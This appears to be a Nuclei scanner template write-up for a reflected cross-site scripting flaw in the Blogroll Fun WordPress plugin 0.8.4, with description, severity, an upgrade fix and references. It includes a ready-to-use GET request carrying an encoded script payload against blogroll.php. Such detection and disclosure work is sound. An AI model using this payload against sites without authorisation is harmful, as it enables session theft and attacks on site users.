# Nuclei Template: WordPress Blogroll Fun-Show Last Post and Last Update Time 0.8.4 - Cross-Site Scripting
**Template ID:** wp-blogroll-fun-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-blogroll-fun-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Plugin Blogroll Fun-Show Last Post and Last Update Time 0.8.4 and possibly prior versions are prone to a cross-site scripting vulnerability because of a failure to properly sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/blogroll-fun/blogroll.php?k=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## Remediation
Update to plugin version 0.8.5 or later.

## References
- https://codevigilant.com/disclosure/wp-plugin-blogroll-fun-a3-cross-site-scripting-xss/
- https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-blogroll-fun-show-last-post-and-last-update-time-cross-site-scripting-0-8-4/
